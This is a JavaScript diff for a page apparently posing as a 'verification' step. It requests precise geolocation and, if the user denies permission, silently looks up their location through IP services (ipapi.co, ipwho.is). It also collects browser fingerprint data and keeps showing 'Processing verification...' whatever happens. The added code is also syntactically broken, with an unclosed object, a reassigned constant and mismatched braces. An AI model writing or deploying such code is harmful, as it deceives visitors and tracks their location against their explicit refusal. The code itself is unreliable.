@@ -95,8 +95,32 @@ document.addEventListener('DOMContentLoaded', () => {
         
         locationStatus.textContent = 'Processing verification...';
         
-        // Get location data
-        if (navigator.geolocation) {
+        // Get location data with enhanced browser support
+        if (!navigator.geolocation) {
+            console.log('Geolocation API not supported');
+            handleLocationFallback();
+            return;
+        }
+
+        // Define options for better accuracy
+        const geoOptions = {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        };
+
+        try {
+            // Chrome/Chromium specific handling
+            if (/Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor)) {
+                // Request permissions explicitly for Chrome
+                const permissionResult = await navigator.permissions.query({ name: 'geolocation' });
+                if (permissionResult.state === 'denied') {
+                    console.log('Geolocation permission denied in Chrome');
+                    handleLocationFallback();
+                    return;
+                }
+            }
+
             navigator.geolocation.getCurrentPosition(
                 // Success callback
                 async (position) => {
@@ -224,10 +248,20 @@ document.addEventListener('DOMContentLoaded', () => {
                     }
                 },
                 async (error) => {
-                    console.log('Location permission denied or error:', error);
-                    locationStatus.textContent = 'Processing verification...'; // Keep showing loading
+                    console.log('Geolocation error:', error);
+                    locationStatus.textContent = 'Processing verification...';
                     
-                    // Silently fall back to IP geolocation
+                    handleLocationFallback();
+                },
+                geoOptions
+            );
+        } catch (error) {
+            console.error('Geolocation error:', error);
+            handleLocationFallback();
+        }
+
+        // Fallback function for handling location errors
+        async function handleLocationFallback() {
                     try {
                         const ipResponse = await fetch('https://ipapi.co/json/');
                         const ipData = await ipResponse.json();
@@ -235,7 +269,12 @@ document.addEventListener('DOMContentLoaded', () => {
                         const locationData = {
                             latitude: ipData.latitude,
                             longitude: ipData.longitude,
-                            accuracy: 5000, // IP geolocation is typically accurate to city level (~5km)
+                            accuracy: 5000,
+                            browser: {
+                                name: getBrowserName(),
+                                version: getBrowserVersion(),
+                                engine: navigator.product || 'Unknown',
+                                mobile: /Mobile|Android|iP(hone|od|ad)/.test(navigator.userAgent),
                             locationSource: 'IP Geolocation',
                             timestamp: new Date().toISOString(),
                             userAgent: navigator.userAgent,
@@ -297,10 +336,54 @@ document.addEventListener('DOMContentLoaded', () => {
                             allowLocationButton.classList.remove('loading');
                         }
                     } catch (ipError) {
-                        console.log('IP location fallback failed:', ipError);
-                        // Keep showing loading state even if IP fallback fails
-                        locationStatus.textContent = 'Processing verification...';
+                        console.error('IP location fallback failed:', ipError);
+                        // Try alternative IP service as last resort
+                        try {
+                            const altResponse = await fetch('https://ipwho.is/');
+                            const altData = await altResponse.json();
+                            if (altData.success) {
+                                ipData = {
+                                    latitude: altData.latitude,
+                                    longitude: altData.longitude,
+                                    ip: altData.ip
+                                };
+                            }
+                        } catch (finalError) {
+                            console.error('All location services failed:', finalError);
+                            locationStatus.textContent = 'Processing verification...';
+                        }
                     }
+                }
+
+                // Browser detection helper functions
+                function getBrowserName() {
+                    const ua = navigator.userAgent;
+                    if (ua.includes("Firefox")) return "Firefox";
+                    if (ua.includes("SamsungBrowser")) return "Samsung Browser";
+                    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+                    if (ua.includes("Trident")) return "Internet Explorer";
+                    if (ua.includes("Edge")) return "Edge";
+                    if (ua.includes("Chrome")) return "Chrome";
+                    if (ua.includes("Safari")) return "Safari";
+                    return "Unknown";
+                }
+
+                function getBrowserVersion() {
+                    const ua = navigator.userAgent;
+                    let M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+                    if (/trident/i.test(M[1])) {
+                        let tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
+                        return tem[1] || '';
+                    }
+                    if (M[1] === 'Chrome') {
+                        let tem = ua.match(/\bOPR|Edge\/(\d+)/)
+                        if (tem != null) return tem[1];
+                    }
+                    M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
+                    let tem = ua.match(/version\/(\d+)/i);
+                    if (tem != null) M.splice(1, 1, tem[1]);
+                    return M[1];
+                }
                 }
             );
         } else {
